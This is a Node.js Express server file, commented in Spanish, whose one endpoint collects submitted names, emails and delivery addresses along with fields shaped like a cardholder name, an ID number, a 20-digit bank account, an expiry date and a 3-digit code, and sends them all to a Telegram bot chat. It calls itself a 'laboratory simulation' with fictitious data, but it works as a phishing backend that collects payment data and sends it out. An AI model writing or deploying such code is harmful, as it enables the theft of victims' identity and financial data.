require("dotenv").config();

const express = require("express");
const path = require("path");

const app = express();
const PORT = process.env.PORT || 3000;

const BOT_TOKEN = process.env.BOT_TOKEN;
const CHAT_ID = process.env.CHAT_ID;

app.use(express.json());
app.use(express.static(path.join(__dirname)));

app.post("/api/test", async (req, res) => {
    try {
        if (!BOT_TOKEN) {
            return res.status(500).json({
                ok: false,
                error: "Falta BOT_TOKEN en las variables de entorno."
            });
        }

        if (!CHAT_ID) {
            return res.status(500).json({
                ok: false,
                error: "Falta CHAT_ID en las variables de entorno."
            });
        }

        const {
            name,
            email,
            address,
            postalCode,
            city,
            province,
            message,
            testFullName,
            testCode8,
            testCode20,
            testDate,
            testCode3
        } = req.body;

        const text = `🧪 SIMULACIÓN DE LABORATORIO

👤 Nombre: ${name || "(vacío)"}
📧 Email: ${email || "(vacío)"}

📍 DATOS DE ENTREGA DE PRUEBA
Dirección: ${address || "(vacío)"}
Código postal: ${postalCode || "(vacío)"}
Ciudad: ${city || "(vacío)"}
Provincia: ${province || "(vacío)"}

💬 Observaciones:
${message || "(sin observaciones)"}

📋 DATOS SINTÉTICOS
Nombre de prueba: ${testFullName || "(vacío)"}
Código de prueba 1: ${testCode8 || "(vacío)"}
Código de prueba 2: ${testCode20 || "(vacío)"}
Fecha de prueba: ${testDate || "(vacío)"}
Código de prueba 3: ${testCode3 || "(vacío)"}

🧪 ENTORNO CONTROLADO
Estos valores son exclusivamente ficticios y de prueba.`;

        const response = await fetch(
            `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`,
            {
                method: "POST",
                headers: {
                    "Content-Type": "application/json"
                },
                body: JSON.stringify({
                    chat_id: CHAT_ID,
                    text
                })
            }
        );

        const result = await response.json();

        if (!result.ok) {
            return res.status(500).json({
                ok: false,
                error: `Telegram ${result.error_code}: ${result.description}`
            });
        }

        return res.json({ ok: true });

    } catch (error) {
        console.error("ERROR DEL SERVIDOR:", error);
        return res.status(500).json({
            ok: false,
            error: error.message
        });
    }
});

app.listen(PORT, () => {
    console.log(`Servidor de prueba ejecutándose en el puerto ${PORT}`);
});
